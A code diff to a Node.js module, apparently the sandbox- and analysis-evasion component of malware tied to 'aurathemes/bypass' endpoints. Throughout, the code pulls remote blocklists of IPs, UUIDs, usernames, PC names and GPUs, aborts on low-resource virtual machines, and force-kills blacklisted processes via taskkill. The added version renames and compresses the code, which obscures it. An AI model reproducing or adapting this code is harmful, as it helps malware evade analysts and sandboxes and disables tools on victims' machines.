@@ -1,37 +1,34 @@
-const util = require("util");
-const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 const process = require("process");
-const exec = util.promisify(require("child_process").exec);
+const util = require("util");
+const child_process = require("child_process");
+const fetch = (...a) => import('node-fetch').then(({ default: fetch }) => fetch(...a));
+const exec = util.promisify(child_process.exec);
 
-const fetchj = async (u) => {
-  const r = await fetch(u);
-  return r.json();
-};
-
-const isBlocked = async (u, v) => {
+const request = async (u) => {
   try {
-    const d = await fetchj(u);
-    return d.includes(v);
-  } catch (err) {
-    console.error(err);
-    return false;
+    let r = await fetch(u);
+    return r.json();
+  } catch (e) {
+    console.error(e);
+    return {};
   }
 };
 
-const fetchKill = async (u, c) => {
+const killer = async (u, c) => {
   try {
-    const d = await fetchj(u);
-    const { stdout } = await exec(c);
-    const pss = stdout.split(/\r?\n/);
-    const b = d.blacklistedprog;
-
-    for (const p of pss) {
-      const pn = p.split(/\s+/)[0].replace(".exe", "");
-      if (!pn.toLowerCase() === "cmd" && b.includes(pn)) {
+    let d = await request(u),
+      {
+        stdout
+      } = await exec(c),
+      s = stdout.split(/\r?\n/),
+      b = d.blacklistedprog;
+    for (p of s) {
+      let n = p.split(/\s+/)[0].replace(".exe", "");
+      if (!n.toLowerCase() === "cmd" && b.includes(n)) {
         try {
-          await exec(`taskkill /F /IM ${pn}.exe`);
+          await exec(`taskkill /F /IM ${n}.exe`);
         } catch (err) {
-          //console.error(err);
+          return ""
         }
       }
     }
@@ -40,89 +37,52 @@ const fetchKill = async (u, c) => {
   }
 };
 
-const killBlacklisted = async () => {
-  await fetchKill(
-    "https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
-    "tasklist"
-  );
-};
-
-const checkBlocked = async (u, v) => {
-  return await isBlocked(`https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${u}?aurathemes=true`, v);
-};
-
-const gpuBlocked = async (_) => {
-  await checkBlocked("gpus", _);
-};
-
-const osBlocked = async (_) => {
-  await checkBlocked("oss", _);
-};
-
-const pcNameBlocked = async (_) => {
-  await checkBlocked("pcnames", _);
-};
-
-const usernameBlocked = async (_) => {
-  await checkBlocked("progr", _);
-};
-
-const uuidBlocked = async (_) => {
-  await checkBlocked("uuids", _);
-};
-
-const ipBlocked = async (_) => {
-  await checkBlocked("ips", _);
-};
-
-const debuggerx = async (enable, disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion) => {
-  if (enable === "no") return;
-
+const IS_BLOCKED = async (u, v) => {
   try {
-    const [
-      pcName,
-      userName
-    ] = [
-        process.env.COMPUTERNAME || "Not found",
-        process.env.USERNAME || "Not found",
-      ];
+    const d = await request(u);
+    return d.includes(v);
+  } catch (e) {
+    console.error(e);
+    return false;
+  }
+};
 
-    const [
-      isBlockedIP,
-      isBlockedUID,
-      isBlockedUsername,
-      isBlockedPCName,
-      isBlockedOS,
-      isBlockedGpu,
-    ] = await Promise.all([
-      ipBlocked(ip),
-      uuidBlocked(uid),
-      usernameBlocked(userName),
-      pcNameBlocked(pcName),
-      osBlocked(os),
-      gpuBlocked(gpu),
+const KILL_BLACK = async () => await killer("https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true","tasklist");
+
+const CHECK_BLOCKED = async (u, v) => await IS_BLOCKED(`https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${u}?aurathemes=true`, v);
+
+const GPU_BLOCKED = async (u) => await CHECK_BLOCKED("gpus", u);
+
+const OS_BLOCKED = async (q) => await CHECK_BLOCKED("oss", q);
+
+const PCNAME_BLOCKED = async (r) => await CHECK_BLOCKED("pcnames", r);
+
+const USERNAME_BLOCKED = async (f) => await CHECK_BLOCKED("progr", f);
+
+const UUID_BLOCKED = async (a) => await CHECK_BLOCKED("uuids", a);
+
+const IP_BLOCKED = async (s) => await CHECK_BLOCKED("ips", s);
+
+const debuggerx = async (a, d, r, i, c, l, q, ñ, p, w, z) => {
+  if (a === "no") return;
+  try {
+    const [ p, u ] = [process.env.COMPUTERNAME || "Not found",process.env.USERNAME || "Not found",];
+    const [ g, h, j, k, f, m ] = await Promise.all([
+      IP_BLOCKED(l),
+      UUID_BLOCKED(i),
+      USERNAME_BLOCKED(u),
+      PCNAME_BLOCKED(p),
+      OS_BLOCKED(q),
+      GPU_BLOCKED(p),
     ]);
-
-    if (
-      (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2)
-      || (!isNaN(cpucount) && cpucount < 2)
-      || isBlockedGpu
-      || isBlockedOS
-      || isBlockedIP
-      || isBlockedUID
-      || isBlockedUsername
-      || isBlockedPCName
-    ) {
-      process.abort() && process.exit(1);
-    }
-
+    if ((!isNaN(d) && d < 80 && !isNaN(r) && r < 2)|| (!isNaN(c) && c < 2) || g || h || j || k || f || m) process.abort() && process.exit(1);
     try {
-      await killBlacklisted();
+      await KILL_BLACK();
     } catch (e) {
       console.error(e);
     }
-  } catch (err) {
-    console.error(err);
+  } catch (e) {
+    console.error(e);
   }
 };
 
